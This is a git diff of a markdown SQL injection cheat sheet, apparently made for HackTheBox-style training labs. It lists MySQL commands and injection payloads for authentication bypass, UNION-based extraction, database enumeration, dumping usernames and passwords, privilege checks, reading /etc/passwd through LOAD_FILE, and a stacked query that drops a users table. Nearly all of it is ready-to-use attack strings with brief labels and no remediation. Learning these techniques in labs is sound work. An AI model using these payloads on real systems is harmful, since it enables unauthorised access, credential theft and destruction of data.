@@ -1,7 +1,20 @@
 # SQL Injection
 
+## Types of SQL Injection (SQLi)
+
+| Type           | Description                              | Example                          | Useful/Where Can't Be Used                     |
+|----------------|------------------------------------------|----------------------------------|------------------------------------------------|
+| Classic        | Direct injection into input fields.      | `' OR '1'='1`                   | Useful for basic input fields; can't use if input is sanitized. |
+| Union-Based    | Uses UNION operator to extract data.     | `' UNION SELECT NULL, username, password --` | Useful with multiple columns; can't use if UNION is blocked. |
+| Error-Based    | Exploits database errors to reveal data. | `' AND 1=(SELECT COUNT(*))`     | Useful with error messages; can't use if errors are suppressed. |
+| Blind (Boolean)| Infers data via true/false responses.    | `' AND SUBSTRING(version(), 1, 1)=5` | Useful when errors are suppressed; can't use if responses are identical. |
+| Blind (Time-Based) | Delays response based on conditions. | `' OR IF(1=1, SLEEP(5), 0)`    | Useful with no output; can't use if timing controls are strict. |
+| Stacked Queries | Executes multiple statements.            | `'; DROP TABLE users; --`       | Useful if multi-queries allowed; can't use if DBMS restricts it. |
+
 ## MySQL
+
 ### General
+
 | Command | Description |
 |---------|-------------|
 | `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
@@ -9,6 +22,7 @@
 | `USE users` | Switch to database |
 
 ### Tables
+
 | Command | Description |
 |---------|-------------|
 | `CREATE TABLE logins (id INT, ...)` | Add a new table |
@@ -19,6 +33,7 @@
 | `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
 
 ### Columns
+
 | Command | Description |
 |---------|-------------|
 | `SELECT * FROM table_name` | Show all columns in a table |
@@ -30,6 +45,7 @@
 | `ALTER TABLE logins DROP oldColumn` | Delete column |
 
 ### Output
+
 | Command | Description |
 |---------|-------------|
 | `SELECT * FROM logins ORDER BY column_1` | Sort by column |
@@ -41,6 +57,7 @@
 | `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
 
 ### MySQL Operator Precedence
+
 - Division (/), Multiplication (*), and Modulus (%)
 - Addition (+) and Subtraction (-)
 - Comparison (=, >, <, <=, >=, !=, LIKE)
@@ -49,14 +66,18 @@
 - OR (||)
 
 ## SQL Injection
+
 ### Auth Bypass
+
 | Payload | Description |
 |---------|-------------|
 | `admin' or '1'='1` | Basic Auth Bypass |
 | `admin')-- -` | Basic Auth Bypass With comments |
 
 ### Auth Bypass Payloads
+
 ### Union Injection
+
 | Payload | Description |
 |---------|-------------|
 | `' order by 1-- -` | Detect number of columns using order by |
@@ -65,6 +86,7 @@
 | `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
 
 ### DB Enumeration
+
 | Payload | Description |
 |---------|-------------|
 | `SELECT @@version` | Fingerprint MySQL with query output |
@@ -76,6 +98,7 @@
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
 
 ### Privileges
+
 | Payload | Description |
 |---------|-------------|
 | `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
@@ -84,6 +107,7 @@
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
 
 ### File Injection
+
 | Payload | Description |
 |---------|-------------|
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
